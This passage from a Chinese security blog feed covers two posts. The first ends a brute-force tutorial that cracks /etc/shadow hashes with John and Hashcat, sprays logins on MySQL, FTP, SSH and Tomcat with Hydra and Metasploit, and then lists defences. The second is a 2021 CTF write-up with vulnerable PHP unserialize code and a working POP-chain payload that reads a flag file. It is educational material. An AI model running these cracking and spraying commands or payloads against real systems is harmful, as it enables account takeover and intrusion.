class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tail -n 1 /etc/passwd</span>              </span><br><span class="line">test:x:1001:1001::/home/test:/bin/sh</span><br></pre></td></tr></table></figure><p><strong>/etc/shadow</strong></p><p>只有 root 用户权限能够查看</p><p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分</p><ol><li>用户名</li><li>加密后的密码</li><li>上次修改密码的时间 (从 1970.1.1 开始的总天数)</li><li>两次修改密码间隔的最少天数，如果为 0，则没有限制</li><li>两次修改密码间隔最多的天数, 表示该用户的密码会在多少天后过期，如果为 99999 则没有限制</li><li>提前多少天警告用户密码将过期</li><li>在密码过期之后多少天禁用此用户</li><li>用户过期日期 (从 1970.1.1 开始的总天数)，如果为 0，则该用户永久可用</li><li>保留</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> tail -n 1 /etc/shadow</span></span><br><span class="line">test:$6$7uNh9hzdvpT3BRuB$ndF3AH.faJPvlgA.d57JOmFTLeQEuzgVFc.sYfI5VZDkOC6D78x9at.d8eTqRuTJsqjd6uboKmmYp75wbqE1e/:18825:0:99999:7:::</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>密码字符串为*，表示系统用户不能被登入</li><li>密码字符串为!，表示用户名被禁用，可以在机器上转到该用户，但无法远程登录</li><li>密码字符串为空，则表示没有密码</li></ul><p>密文由三部分组成：<code>$id$salt$encrypted</code>，id表示加密算法，salt 表示密码学中的 Salt, 系统随机生成 encrypted 表示密码的 hash</p><ul><li>DES和明文开头无标记</li><li>id为1时，采用md5进行加密；</li><li>id为5时，采用SHA256进行加密；</li><li>id为6时，采用SHA512进行加密。</li></ul><p><strong>破解Hash</strong></p><p>方式一：<strong>John the Ripper</strong></p><p>这里使用kali自带的John工具进行破解</p><p>使用字典破解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/john/password.lst /etc/shadow</span><br></pre></td></tr></table></figure><p>或直接暴力破解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john /etc/shadow</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717154253923.png" alt="image-20210717154253923"></p><p><strong>方式二：Hashcat</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1800 -o found1.txt /etc/shadow /usr/share/john/password.lst </span><br></pre></td></tr></table></figure><p>参数说明：</p><p>-m 1800：hash-type，1800对应SHA512</p><p>-o found1.txt：破解结果输出到found1.txt中</p><p>/etc/shadow：含要破解密文的文件</p><p>/usr/share/john/password.lst：字典文件</p><p>结果如图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210717160033067.png" alt="image-20210717160033067"></p><h2 id="3-密码喷洒"><a href="#3-密码喷洒" class="headerlink" title="3.密码喷洒"></a>3.密码喷洒</h2><p><strong>Mysql爆破</strong></p><p>使用工具–Kali-Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.100.250 -l wyw -P password.txt mysql -V</span><br><span class="line">#hydra IP地址 -l 单个账户名 -P 字典路径 服务名 -V</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715162708548.png" alt="image-20210715162708548"></p><p>使用工具–Kali-Metasploit</p><pre><code>  ①：use auxiliary/scanner/mysql/mysql_login   ②：show options  ③：set RHOSTS IP地址  ④：set USERNAME 单个账户  ⑤：set PASS_FILE 字典路径地址  ⑥：set RPORT 端口号  ⑦：run</code></pre><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715164750258.png" alt="image-20210715164750258"></p><p>遇到的坑：</p><ol><li><p>3306端口需对外开放</p></li><li><p>mysql用户允许远程连接数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39; with grant option;</span><br></pre></td></tr></table></figure></li><li><p>若出现如下错误，需修改mysql字符集</p></li></ol><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210715165113384.png" alt="image-20210715165113384"></p><p>修改<code>my.ini</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character-set-server&#x3D;utf8</span><br></pre></td></tr></table></figure><p>类似的，FTP、SSH、Tomcat等也可以利用此工具爆破。</p><ul><li>FTP</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ftp&#x2F;ftp_login</span><br></pre></td></tr></table></figure><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.146.141 -l admin -P &#x2F;top1500.txt ftp -V</span><br></pre></td></tr></table></figure><ul><li>SSH</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login</span><br></pre></td></tr></table></figure><p>Hydra</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra 192.168.146.141 -l root -P &#x2F;top1500.txt ssh -V</span><br></pre></td></tr></table></figure><ul><li>Tomcat</li></ul><p>msf</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;http&#x2F;tomcat_mgr_login</span><br></pre></td></tr></table></figure><h1 id="0x03-其他场景"><a href="#0x03-其他场景" class="headerlink" title="0x03 其他场景"></a>0x03 其他场景</h1><p>前面描述了针对登录用户和密码的暴力破解，暴力破解是否还可以用在其他场景呢？答案是肯定的，因为涉及人机交互的内容本质还是一个题目验证场景，在以下这些场景中，也有可能遭遇到暴力破解攻击。</p><p><strong>图形验证码</strong>–同样的使用穷举方法，假设Web应用的登录验证码的范围是一个可衡量的值，攻击者可以使用工具将所有的验证码问题请求及结果保存为合集，并在后续的破解过程中调用这个结果合集；</p><p><strong>短信/邮箱验证码</strong>–针对四到六位纯数字的短信或邮箱验证码，也可以用暴力破解的方法进行猜解攻击尝试；</p><p><strong>关键参数</strong>–针对应用中的关键参数的，亦可以用穷举法进行遍历，当存在权限控制不当时，这种遍历方法还能批量获取敏感信息。如枚举订单号后并提交订单查询，在权限控制不当的Web应用中，这会导致批量的用户订单信息泄露。</p><h1 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h1><p>针对暴力破解攻击，应用的安全设计要多方考量，从每一个可能的受攻击面出发，结合逆向的逻辑思路，建立合理的防御机制。常见的防御措施如下。</p><p>1)用户名或密码输入错误时统一返回“登录错误，请重试”提示信息</p><p>2)在用户登录时增加验证码，防止通过程序自动枚举账户</p><p>3)验证码应具有足够的随机性和干扰性，考虑逻辑和交互式验证码</p><p>4)确保所有类型的验证码能够用后即失效，防范可被重用</p><p>5)在用户登录中增加对同一IP地址尝试次数的限制</p><p>6)系统自身安全性增强：强制要求用户注册时满足口令复杂度要求</p><p>7)定期对比数据库存储的密码密文值与top500弱密码的密文值</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/Home_pig/article/details/83722076">暴力破解</a></p><p>[2] <a href="https://www.sqlsec.com/2019/11/winhash.html">Windows 用户密码的加密方法与破解</a></p><p>[3] <a href="https://blog.csdn.net/zhang14916/article/details/86539098?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-1&spm=1001.2101.3001.4242">web渗透—暴力破解</a></p><p>[4] <a href="https://www.sohu.com/a/303862550_534345">【技术工场】浅谈暴力破解攻击</a> </p><p>[5] <a href="https://zhuanlan.zhihu.com/p/149825451">暴力破解方法汇总——远程服务爆破篇</a></p><p>[6] <a href="https://blog.csdn.net/zsj2102/article/details/81166534">Linux 下的密码 Hash破解方法</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透初探 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从强网杯2021线上赛习得</title>
      <link href="posts/23985.html"/>
      <url>posts/23985.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>强网杯的题目质量就是高，奈何没几个我会做的😣（还是太菜）</p><p>以下对从这次比赛所学习到的干货（主要是web方面）进行记录。</p><h1 id="0x01-pop-master"><a href="#0x01-pop-master" class="headerlink" title="0x01 pop_master"></a>0x01 pop_master</h1><p>index.php 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//class.php.txt</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$class</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$class</span>-&gt;NGPaqV(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>明显是考察反序列化，但打开<code>class.php.txt</code>后就傻了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210617180619219.png" alt="image-20210617180619219"></p><p>好家伙，近17万行代码，这得有多少个类。虽然知道肯定很多类是来混淆的，但从中找出可利用的类进行构造，其工作量之大！写脚本找可行，但不会啊（流下了没有技术的泪水）。</p><p>赛后看师傅的wp，过滤的思路是这样的：</p><ol><li>eval 没被引用，过滤</li><li>for 循环中会覆盖传入参数值，过滤</li><li>eval 前会覆盖值参数值，过滤</li><li>除了入口函数外，其他函数只被引用一次的，过滤</li></ol><p>依此编写脚本（看不太懂QAQ），过滤完后找到关键的eval，构造POP链，获取flag。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image.png"></p><h1 id="0x02-强网先锋-赌徒"><a href="#0x02-强网先锋-赌徒" class="headerlink" title="0x02 [强网先锋]赌徒"></a>0x02 [强网先锋]赌徒</h1><p>目录爆破后得到<code>www.zip</code>，下载后是<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>出现的魔术方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__construct   当一个对象创建时被调用，</span><br><span class="line">__toString   当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()   使用unserialize时触发</span><br><span class="line">__get()    用于从不可访问的属性读取数据</span><br><span class="line">#不可访问包括：（1）私有属性，（2）没有初始化的属性</span><br><span class="line">__invoke()   当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>构造POP链</p><ol><li>当用get方法传入一个hello参数后，因有反序列化的操作，会自动调用Start类中的__wakeup方法</li><li>__wakeup方法会执行sayhello()这个方法，如果name属性是Info类的一个对象，那么因为这个对象被当成字符串打印了，所以会自动调用Info类的toString方法</li><li>__toString方法返回file[‘filename’]的ffiillee[‘ffiilleennaammee’]属性，如果file[‘filename’]是Room的一个对象，因为Room类里没有ffiillee[‘ffiilleennaammee’]这个属性，这就相当于从不可访问的属性读取数据，所以会自动调用Room类的get方法</li><li>__get方法把a属性赋值给function，然后执行function方法，如果a属性是Room的一个对象，这就相当于将对象作为函数调用，所以会自动触发Room类的invoke方法</li><li>__invoke方法执行Get_hint函数，Get_hint()将flag以base64编码并打印出来</li></ol><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span> = <span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span> = <span class="string">&#x27;Ido&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Start();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="keyword">new</span> Info();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="variable">$a</span>-&gt;name-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;a=<span class="keyword">new</span> Room();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64解码得到flag</p><h1 id="0x03-强网先锋-寻宝"><a href="#0x03-强网先锋-寻宝" class="headerlink" title="0x03 [强网先锋]寻宝"></a>0x03 [强网先锋]寻宝</h1><p><strong>key1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filter_word</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;index&#x27;</span>,<span class="string">&#x27;KeY1lhv&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;key&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\(&#x27;</span>,<span class="string">&#x27;\.&#x27;</span>,<span class="string">&#x27;num&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;\/&#x27;</span>,<span class="string">&#x27;\,&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;0000000&#x27;</span>);</span><br><span class="line">        <span class="variable">$filter_phrase</span>= <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_word</span>).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_replace(<span class="variable">$filter_phrase</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ppp</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$ppp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;nunber3&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$num1</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number1&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num2</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number2&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num3</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number3&#x27;</span>]);        </span><br><span class="line"><span class="variable">$num4</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number4&#x27;</span>]);</span><br><span class="line"><span class="variable">$num5</span> = filter(<span class="variable">$ppp</span>[<span class="string">&#x27;number5&#x27;</span>]);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num1</span>) &amp;&amp; is_numeric(<span class="variable">$num1</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;非数字&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num1</span> &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;第一层&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num2</span>) &amp;&amp; strlen(<span class="variable">$num2</span>) &lt;= <span class="number">4</span> &amp;&amp; intval(<span class="variable">$num2</span> + <span class="number">1</span>) &gt; <span class="number">500000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;第二层&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$num3</span>) &amp;&amp; <span class="string">&#x27;4bf21cd&#x27;</span> === substr(md5(<span class="variable">$num3</span>),<span class="number">0</span>,<span class="number">7</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;第三层&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(!(<span class="variable">$num4</span> &lt; <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> == <span class="number">0</span>)&amp;&amp;(<span class="variable">$num4</span> &lt;= <span class="number">0</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) &gt; <span class="number">6</span>)&amp;&amp;(strlen(<span class="variable">$num4</span>) 